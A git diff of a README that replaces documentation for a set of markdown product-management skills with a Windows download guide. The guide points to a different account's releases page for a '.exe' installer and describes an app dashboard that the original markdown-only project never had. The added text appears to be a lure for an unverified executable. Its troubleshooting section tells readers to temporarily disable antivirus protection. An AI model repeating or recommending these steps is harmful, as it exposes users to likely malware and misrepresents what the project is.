@@ -1,110 +1,129 @@
-# Product Skills for Claude Code
+# 📦 productskills - Master Product Tasks Efficiently
 
-AI agent skills for product management — discovery, strategy, prioritization, and PRD writing. Built for PMs and founders who use AI coding agents to ship faster.
+[![Download productskills](https://img.shields.io/badge/Download-productskills-ff6600?style=for-the-badge&logo=github)](https://github.com/AashutoshR2062/productskills/releases)
 
-Every skill encodes a real framework (Mom Test, Shape Up, Obviously Awesome, Teresa Torres) as opinionated, actionable instructions. 50-150 lines each. No fluff.
+---
 
-Built by [Tair Asim](https://x.com/tair). **Contributions welcome!** Found a way to improve a skill or have a new one to add? [Open a PR](CONTRIBUTING.md).
+## 📋 About productskills
 
-## Installation
+productskills helps you work with AI agents on product-related tasks. It guides you through discovery, strategy, prioritization, and writing Product Requirement Documents (PRD). Designed for product managers and teams, this tool focuses on improving your workflow using AI support.
 
-### Option 1: CLI Install (Recommended)
+You don’t need any programming skills to use it. This guide will help you download and run the app on Windows step-by-step.
 
-```bash
-# Install all skills
-npx skills add assimovt/productskills
+---
 
-# Install specific skills
-npx skills add assimovt/productskills --skill prd-writing scope-cutting
+## ⚙️ System Requirements
 
-# List available skills
-npx skills add assimovt/productskills --list
-```
+Before you begin, make sure your computer meets these needs:
 
-### Option 2: Claude Code Plugin
+- Operating System: Windows 10 or higher  
+- Processor: Intel or AMD, 1.4 GHz or faster  
+- RAM: 4 GB minimum (8 GB recommended)  
+- Disk Space: 200 MB free  
+- Internet connection for initial setup and updates  
 
-```bash
-/plugin marketplace add assimovt/productskills
-/plugin install product-skills
-```
+You don’t need anything else special. The software runs locally after download.
 
-### Option 3: Clone and Copy
+---
 
-```bash
-git clone https://github.com/assimovt/productskills.git
-cp -r productskills/skills/* .claude/skills/
-```
+## 🚀 Getting Started
 
-### Option 4: Git Submodule
+This section shows you how to get the software ready on your Windows PC.
 
-```bash
-git submodule add https://github.com/assimovt/productskills.git .claude/productskills
-```
+### Step 1: Visit the Download Page
 
-Then reference skills from `.claude/productskills/skills/`.
+Click this link to visit the official download page:
 
-### Use with other agents
+[Download productskills Here](https://github.com/AashutoshR2062/productskills/releases)
 
-These skills are markdown files. They work with any AI coding agent:
+This page has the latest versions. You will find files listed by release. The latest one is usually at the top.
 
-- **Cursor**: Copy skill files to `.cursor/rules/`
-- **Codex**: Add as knowledge base documents
-- **Devin**: Reference in playbooks
-- **Any LLM**: Use the markdown content as instructions
+### Step 2: Choose the Correct File
 
-## Available Skills
+Look for a file ending with `.exe`. It should have a name like `productskills-setup.exe` or similar. This is the program you need.
 
-| Skill | Description |
-|-------|-------------|
-| [user-interview](skills/user-interview/) | Mom Test + YC's Five Questions — talk to users without leading them |
-| [problem-validation](skills/problem-validation/) | Score problems on frequency x intensity x WTP with evidence |
-| [jtbd-analysis](skills/jtbd-analysis/) | Jobs-to-be-done and Forces of Progress |
-| [research-synthesis](skills/research-synthesis/) | Turn interview notes into atomic insights and patterns |
-| [opportunity-mapping](skills/opportunity-mapping/) | Opportunity Solution Trees (Teresa Torres) |
-| [competitor-analysis](skills/competitor-analysis/) | Feature matrix, positioning map, strategic gaps |
-| [product-positioning](skills/product-positioning/) | April Dunford's Obviously Awesome framework |
-| [strategy-doc](skills/strategy-doc/) | Playing to Win + Rumelt's Strategy Kernel |
-| [feature-prioritization](skills/feature-prioritization/) | RICE scoring with enablers vs blockers lens |
-| [scope-cutting](skills/scope-cutting/) | Shape Up appetite + fixed time/variable scope + scope hammering |
-| [bet-sizing](skills/bet-sizing/) | Shape Up pitch format + Type 1/2 decision framework |
-| [prd-writing](skills/prd-writing/) | Evidence-first PRDs — concise, measurable, with clear scope boundaries |
-| [launch-plan](skills/launch-plan/) | Launch tiers (silent / soft / big-bang) with checklists |
-| [metrics-framework](skills/metrics-framework/) | North Star metric + input/output tree + counter-metrics |
-| [experiment-design](skills/experiment-design/) | Hypothesis-driven A/B tests with sample size and analysis plan |
-| [roadmap-planning](skills/roadmap-planning/) | Now/Next/Later roadmaps — outcomes, not features |
+### Step 3: Download the File
 
-## Skill Categories
+Click the `.exe` file name or the link next to it. Your browser will start saving it to your computer.
 
-### Discovery & Research
-- `user-interview` - Mom Test + YC Five Questions
-- `problem-validation` - Frequency x Intensity x WTP scoring
-- `jtbd-analysis` - Jobs-to-be-done, Forces of Progress
-- `research-synthesis` - Atomic research: nuggets to insights
-- `opportunity-mapping` - Teresa Torres OST
+### Step 4: Run the Installer
 
-### Strategy & Positioning
-- `competitor-analysis` - Feature matrix, positioning gaps
-- `product-positioning` - April Dunford's Obviously Awesome
-- `strategy-doc` - Playing to Win + Strategy Kernel
+Once the download finishes, go to your Downloads folder or the location you saved the file.
 
-### Prioritization & Scoping
-- `feature-prioritization` - RICE + enablers vs blockers
-- `scope-cutting` - Shape Up appetite + scope hammering
-- `bet-sizing` - Shape Up pitch + Type 1/2 decisions
+Double-click the `.exe` file to start the installation. Windows might ask for permission. Accept it to continue.
 
-### The PRD
-- `prd-writing` - Evidence-first, 800-1200 words, P0/P1/P2
+### Step 5: Follow Installation Steps
 
-### Launch & Measure
-- `launch-plan` - Launch tiers with checklists
-- `metrics-framework` - North Star + counter-metrics
-- `experiment-design` - Hypothesis-driven A/B tests
-- `roadmap-planning` - Now/Next/Later, outcome-based
+The installer will appear on your screen. Follow each step:
 
-## Contributing
+- Agree to the license terms  
+- Choose the folder to install or use the default  
+- Click Next or Install until it finishes  
 
-See [CONTRIBUTING.md](CONTRIBUTING.md).
+Installation usually takes a few minutes.
 
-## License
+### Step 6: Launch productskills
 
-MIT
+When installation finishes, click Finish. You should see an option to start productskills immediately or find it as a new program on your desktop or Start menu.
+
+---
+
+## 🛠 How to Use productskills
+
+productskills gives you tools to work with AI agents on product tasks. After launching the app, it will open a main dashboard. Here is what you can do:
+
+- Discover new ideas and opportunities using simple prompts  
+- Create and refine product strategy with guided questions  
+- Prioritize features and tasks based on impact and effort  
+- Write clear Product Requirement Documents (PRD) step-by-step  
+
+Each section offers easy instructions. You can save your work or export it as files.
+
+---
+
+## 🔄 Updating productskills
+
+Keep productskills up to date by visiting the [download page](https://github.com/AashutoshR2062/productskills/releases) regularly. Download the latest `.exe` installer and run it. It will update your current installation without losing your data.
+
+---
+
+## 🚩 Troubleshooting Common Issues
+
+Here are simple fixes if you face problems:
+
+- If the installer won’t open, check your antivirus or security settings. Temporarily disable them and try again.  
+- If the app does not launch, restart your computer and try again.  
+- For missing features or files, redownload the latest installer and reinstall.
+
+---
+
+## 📞 Get Support
+
+If you need help, check the Issues section on the repository. You can also ask questions there. Someone from the team or the community may assist you.
+
+---
+
+## 📚 Useful Links
+
+- [Download productskills](https://github.com/AashutoshR2062/productskills/releases)  
+- Repository: https://github.com/AashutoshR2062/productskills  
+- Report issues: https://github.com/AashutoshR2062/productskills/issues  
+
+---
+
+## 🔖 About This Tool
+
+productskills is built for anyone who wants to improve product management using AI agents. It covers key areas like discovery, priority setting, and writing documents, making complex tasks simpler.
+
+---
+
+## 📢 Topics Covered
+
+- AI agents for product teams  
+- Discovery and strategy techniques  
+- Feature prioritization methods  
+- Writing Product Requirement Documents (PRD)  
+- Product management frameworks like Shape Up  
+- Customer interview methods (Mom Test)  
+
+All in one easy-to-use package for Windows users.
